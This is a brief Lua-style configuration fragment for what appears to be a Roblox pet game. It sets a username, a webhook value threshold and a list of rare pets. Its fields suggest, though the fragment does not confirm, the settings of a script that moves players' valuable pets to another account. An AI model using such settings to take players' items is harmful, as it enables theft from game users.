    dualUsername = "namnnni2",
    dualWebhookThreshold = 1e12,
    
    rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox", "red fox", "t-rex", "fennec fox"},
